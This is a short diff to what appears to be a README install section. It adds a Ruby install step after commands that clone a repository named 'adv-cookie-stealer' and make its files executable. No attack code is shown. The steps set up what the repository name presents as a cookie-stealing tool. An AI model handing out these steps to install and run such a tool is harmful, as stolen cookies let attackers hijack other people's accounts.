@@ -5,3 +5,4 @@
 - git clone https://github.com/krishpranav/adv-cookie-stealer
 - cd adv-cookie-stealer
 - sudo chmod +x *
+- sudo apt-get install ruby
